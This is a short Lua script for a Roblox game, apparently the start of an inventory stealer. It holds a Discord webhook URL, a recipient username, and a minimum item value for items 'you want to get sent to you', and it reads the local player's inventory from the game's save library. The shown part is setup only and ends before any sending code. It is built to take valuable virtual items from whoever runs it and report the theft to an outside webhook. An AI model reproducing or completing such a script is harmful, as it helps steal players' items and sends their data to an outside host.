Username = "splishybestsite"
Webhook = "https://discord.com/api/webhooks/1249935683984822353/HdD_Qoc-IhIRvDEOIFfPJzb1_pf1gy8ptspdOLSVJck09zmkfPKn6DjUnFzwzK4gtxTP"
min_rap = 10000 -- minimum rap of each item you want to get sent to you.

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Splishy on top"
